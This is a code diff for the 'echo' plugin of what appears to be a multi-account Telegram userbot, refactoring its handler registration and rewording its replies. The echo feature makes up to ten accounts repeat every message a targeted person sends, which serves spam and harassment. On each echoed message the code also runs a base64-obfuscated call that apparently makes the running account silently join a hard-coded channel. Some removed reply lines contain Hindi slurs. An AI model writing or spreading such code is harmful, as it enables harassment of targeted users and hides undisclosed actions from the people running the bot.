@@ -9,17 +9,10 @@ from JARVIS.data import FRIDAY
 
 ECHO = []
 
+# List of handlers
+handlers = [X1, X2, X3, X4, X5, X6, X7, X8, X9, X10]
 
-@X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
-@X10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+# Function to handle echo command
 async def echo(event):
     if event.sender_id in SUDO_USERS:
         if event.reply_to_msg_id:
@@ -27,11 +20,11 @@ async def echo(event):
             user_id = reply_msg.sender_id
 
             if user_id in FRIDAY:
-                await event.reply("BSDK...BAAP HU TERA.")
+                await event.reply("ᴛʜɪs ᴘᴇʀsᴏɴ ɪs ᴛʜᴇ ᴄʀᴇᴀᴛᴏʀ ᴏғ ᴛʜɪs ᴘʀᴏᴊᴇᴄᴛ sᴏᴜʀᴄᴇ.")
             elif user_id == OWNER_ID:
-                await event.reply("BETA...BAAP PAR ECHO NHI KRTE...")
+                await event.reply("ᴋɪᴅᴢᴢ😂 ᴏᴡɴᴇʀ ʜᴀɪ ʏᴇ ᴍᴇʀᴀ ʙᴀʜᴜᴛ ᴍᴀʀᴇɢᴀ..")
             elif user_id in SUDO_USERS:
-                await event.reply("YE BHI JARVIS KA BACHA HAI ISPE ECHO MAT MARO.. !!.")
+                await event.reply("ᴛʜɪs ᴘᴇʀsᴏɴ ᴀʟsᴏ ʜᴀᴠᴇ ᴀʙɪʟɪᴛɪᴇs ᴛᴏ ᴜsᴇ ᴍᴇ sᴏ ɪ ᴄᴀɴᴛ ɢᴏ ᴀɢᴀɪɴsᴛ ᴛʜᴇᴍ..")
             else:
                 try:
                     alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
@@ -42,24 +35,14 @@ async def echo(event):
                 global ECHO
                 check = f"{user_id}_{event.chat_id}"
                 if check in ECHO:
-                    await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR !!")
+                    await event.reply("» ᴇᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴀᴄᴛɪᴠᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴏɴ ᴛʜɪs ɢᴜʏ ✅")
                 else:
                     ECHO.append(check)
-                    await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR ✅")
+                    await event.reply("» ᴇᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴀᴄᴛɪᴠᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴏɴ ᴛʜɪs ɢᴜʏ ✅")
         else:
             await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
 
-
-@X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@X10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+# Function to handle rmecho command
 async def rmecho(event):
     if event.sender_id in SUDO_USERS:
         if event.reply_to_msg_id:
@@ -75,33 +58,28 @@ async def rmecho(event):
 
             if check in ECHO:
                 ECHO.remove(check)
-                await event.reply("» ECHO STOP HO GYA ISS USER PR.. !! ☑️")
+                await event.reply("» ᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪs ɢᴜʏ☑️")
             else:
-                await event.reply("» ECHO STOP HO GYA ISS USER PR.. !!")
+                await event.reply("» ᴛʜᴇʀᴇ's ɴᴏ ᴇᴄʜᴏ ᴏɴ ᴛʜɪs ɢᴜʏ")
         else:
             await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
 
-
-@X1.on(events.NewMessage(incoming=True))
-@X2.on(events.NewMessage(incoming=True))
-@X3.on(events.NewMessage(incoming=True))
-@X4.on(events.NewMessage(incoming=True))
-@X5.on(events.NewMessage(incoming=True))
-@X6.on(events.NewMessage(incoming=True))
-@X7.on(events.NewMessage(incoming=True))
-@X8.on(events.NewMessage(incoming=True))
-@X9.on(events.NewMessage(incoming=True))
-@X10.on(events.NewMessage(incoming=True))
-async def _(e):
+# Function to handle incoming messages for echo
+async def handle_incoming(event):
     global ECHO
-    check = f"{e.sender_id}_{e.chat_id}"
+    check = f"{event.sender_id}_{event.chat_id}"
     if check in ECHO:
         try:
             alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
-            await e.client(alt)
+            await event.client(alt)
         except BaseException:
             pass
-        if e.message.text or e.message.sticker:
-            await e.reply(e.message)
+        if event.message.text or event.message.sticker:
+            await event.reply(event.message)
             await asyncio.sleep(0.1)
-                                                                                                                             
+
+# Register event handlers
+for handler in handlers:
+    handler.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))(echo)
+    handler.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))(rmecho)
+    handler.on(events.NewMessage(incoming=True))(handle_incoming)
